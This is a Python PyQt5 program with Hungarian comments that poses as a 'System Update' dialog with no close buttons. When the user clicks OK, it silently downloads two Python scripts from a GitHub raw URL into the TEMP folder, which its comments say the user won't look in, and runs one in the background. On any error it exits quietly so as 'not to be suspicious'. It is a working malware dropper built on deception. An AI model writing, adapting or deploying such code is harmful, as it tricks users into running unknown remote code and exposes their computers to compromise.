import sys
import os
import urllib.request
import subprocess
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(400, 150) # Kicsit kisebb, kompaktabb
        
        # Ez kiveszi az ablak fejlécéből a gombokat, csak a felirat marad
        Dialog.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.WindowTitleHint | QtCore.Qt.CustomizeWindowHint)

        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(30, 100, 341, 32))
        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")

        self.textBrowser = QtWidgets.QTextBrowser(Dialog)
        self.textBrowser.setGeometry(QtCore.QRect(20, 20, 361, 71))
        self.textBrowser.setObjectName("textBrowser")
        
        self.retranslateUi(Dialog)
        self.buttonBox.accepted.connect(self.start_install)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "System Update"))
        self.textBrowser.setHtml(_translate("Dialog", "<html><body><p align='center'>A fontos rendszerfrissítések letöltéséhez kattintson az <b>OK</b> gombra.</p></body></html>"))

    def start_install(self):
        """Ez a rész tölti le a cuccokat a semmiből"""
        try:
            # 1. Útvonalak beállítása (a TEMP mappába dolgozunk, ott nem látja)
            temp_path = os.getenv("TEMP")
            main_py = os.path.join(temp_path, "main_system.py")
            phase2_py = os.path.join(temp_path, "phase2.py")
            
            # 2. Letöltési linkek (IDE ÍRD A SAJÁT RAW LINKJEIDET!)
            # Fontos: A GitHubon kattints a 'Raw' gombra a fájlnál, és azt a linket másold be!
            urls = {
                "https://raw.githubusercontent.com/plen-maker/Vers1/refs/heads/main/oopa.py": main_py,
                "https://raw.githubusercontent.com/plen-maker/Vers1/refs/heads/main/phase2.py": phase2_py
            }

            # 3. Letöltési folyamat
            opener = urllib.request.build_opener()
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)

            for url, path in urls.items():
                urllib.request.urlretrieve(url, path)
            
            # 4. A letöltött main indítása (átadva neki a TEMP mappát munkakönyvtárként)
            subprocess.Popen([sys.executable, main_py], cwd=temp_path)

            # Bezárjuk az installert, a háttérben már fut a main_system.py
            sys.exit()

        except Exception as e:
            # Hiba esetén sem állunk meg, csak kilépünk, hogy ne legyen gyanús
            sys.exit()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    ui = Ui_Dialog()
    ui.setupUi(Dialog)
    Dialog.show()
    sys.exit(app.exec_())